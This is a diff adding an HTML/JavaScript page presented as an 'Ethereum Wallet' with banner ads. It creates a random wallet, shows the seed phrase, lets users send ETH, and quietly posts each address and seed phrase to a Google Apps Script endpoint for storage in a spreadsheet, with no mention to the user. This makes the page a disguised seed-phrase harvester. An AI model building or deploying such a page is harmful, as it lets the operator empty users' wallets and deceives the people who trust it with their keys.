@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ethereum Wallet</title>
+  <!-- Include ethers.js via CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" integrity="sha256-84MryXWWa5+9eNxiUvS32eHSM78C82SglqlN4+0GGN4=" crossorigin="anonymous"></script>
+  <style>
+    /* Full-page animated black-purple gradient background */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      background: linear-gradient(-45deg, #000, #4b0082);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+    }
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .container {
+      max-width: 800px;
+      margin: auto;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+    }
+    input, button, textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border-radius: 5px;
+      border: none;
+      font-size: 1em;
+    }
+    button {
+      background-color: #4b0082;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #6a0dad;
+    }
+    .ad-container {
+      text-align: center;
+      margin: 20px 0;
+    }
+    .info-box {
+      background: rgba(0, 0, 0, 0.4);
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+    }
+    .return-home {
+      text-align: center;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Ad iframe at the top -->
+  <div class="ad-container">
+    <iframe data-aa='2382909' src='//ad.a-ads.com/2382909?size=468x60' style='width:468px; height:60px; border:0; padding:0; overflow:hidden; background-color: transparent;'></iframe>
+  </div>
+  
+  <div class="container">
+    <h1>Ethereum Wallet</h1>
+    
+    <!-- Wallet Creation and Display Section -->
+    <div class="info-box" id="walletInfo">
+      <button id="createWalletBtn">Create Wallet</button>
+      <div id="walletDetails" style="display:none;">
+        <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
+        <p><strong>Seed Phrase:</strong> <textarea id="seedPhrase" readonly rows="3"></textarea></p>
+        <p><strong>Balance:</strong> <span id="walletBalance">0</span> ETH</p>
+        <p><strong>ETH Price:</strong> $<span id="ethPrice">0</span></p>
+      </div>
+    </div>
+    
+    <!-- Send ETH Section -->
+    <div class="info-box" id="sendSection" style="display:none;">
+      <h2>Send ETH</h2>
+      <input type="text" id="recipient" placeholder="Recipient Address">
+      <input type="text" id="amount" placeholder="Amount in ETH">
+      <button id="sendBtn">Send ETH</button>
+      <p id="txStatus"></p>
+    </div>
+    
+    <!-- Ad iframe in the middle -->
+    <div class="ad-container">
+      <iframe data-aa='2382909' src='//ad.a-ads.com/2382909?size=468x60' style='width:468px; height:60px; border:0; padding:0; overflow:hidden; background-color: transparent;'></iframe>
+    </div>
+    
+    <!-- Return to Home Button -->
+    <div class="return-home">
+      <button onclick="window.location.href='index.html'">Return to Home</button>
+    </div>
+  </div>
+  
+  <!-- Ad iframe at the bottom -->
+  <div class="ad-container">
+    <iframe data-aa='2382909' src='//ad.a-ads.com/2382909?size=468x60' style='width:468px; height:60px; border:0; padding:0; overflow:hidden; background-color: transparent;'></iframe>
+  </div>
+  
+  <script>
+    // Replace with your Infura project ID and Google Apps Script URL
+    const INFURA_PROJECT_ID = "YOUR_INFURA_PROJECT_ID";
+    const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_SCRIPT_WEBAPP_URL";  // This script should accept POST and save data to Google Sheets.
+    
+    // Set up a provider for the Goerli testnet.
+    const provider = new ethers.providers.InfuraProvider("goerli", INFURA_PROJECT_ID);
+    
+    // Global wallet variable
+    let wallet;
+    
+    // Create wallet button handler.
+    document.getElementById("createWalletBtn").addEventListener("click", async () => {
+      try {
+        // Create a random wallet
+        wallet = ethers.Wallet.createRandom();
+        // Connect wallet to provider so you can query balance and send tx.
+        wallet = wallet.connect(provider);
+        
+        // Display wallet details
+        document.getElementById("walletAddress").innerText = wallet.address;
+        document.getElementById("seedPhrase").value = wallet.mnemonic.phrase;
+        document.getElementById("walletDetails").style.display = "block";
+        document.getElementById("sendSection").style.display = "block";
+        
+        // Save wallet info to your Google Sheet backend.
+        storeWalletInfo(wallet.address, wallet.mnemonic.phrase);
+        
+        // Fetch balance and ETH price immediately.
+        updateBalance();
+        updateEthPrice();
+      } catch (err) {
+        alert("Error creating wallet: " + err.message);
+      }
+    });
+    
+    // Function to update wallet balance.
+    async function updateBalance() {
+      if (!wallet) return;
+      try {
+        const balance = await provider.getBalance(wallet.address);
+        document.getElementById("walletBalance").innerText = ethers.utils.formatEther(balance);
+      } catch (err) {
+        console.error("Balance error:", err);
+      }
+    }
+    
+    // Periodically update ETH price from CoinGecko.
+    async function updateEthPrice() {
+      try {
+        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
+        const data = await response.json();
+        const price = data.ethereum.usd;
+        document.getElementById("ethPrice").innerText = price;
+      } catch (err) {
+        console.error("ETH price error:", err);
+      }
+    }
+    
+    // Refresh ETH price every 15 seconds.
+    setInterval(updateEthPrice, 15000);
+    
+    // Send ETH button handler.
+    document.getElementById("sendBtn").addEventListener("click", async () => {
+      const recipient = document.getElementById("recipient").value;
+      const amount = document.getElementById("amount").value;
+      if (!wallet) {
+        alert("Please create a wallet first.");
+        return;
+      }
+      try {
+        const tx = {
+          to: recipient,
+          value: ethers.utils.parseEther(amount)
+        };
+        document.getElementById("txStatus").innerText = "Sending transaction...";
+        const transactionResponse = await wallet.sendTransaction(tx);
+        document.getElementById("txStatus").innerText = "Transaction sent! Hash: " + transactionResponse.hash;
+        // Update balance after sending.
+        updateBalance();
+      } catch (err) {
+        document.getElementById("txStatus").innerText = "Error: " + err.message;
+      }
+    });
+    
+    // Function to send wallet info to a Google Sheets backend.
+    async function storeWalletInfo(address, seedPhrase) {
+      try {
+        await fetch(GOOGLE_SCRIPT_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ address, seedPhrase })
+        });
+      } catch (err) {
+        console.error("Error storing wallet info:", err);
+      }
+    }
+  </script>
+</body>
+</html>
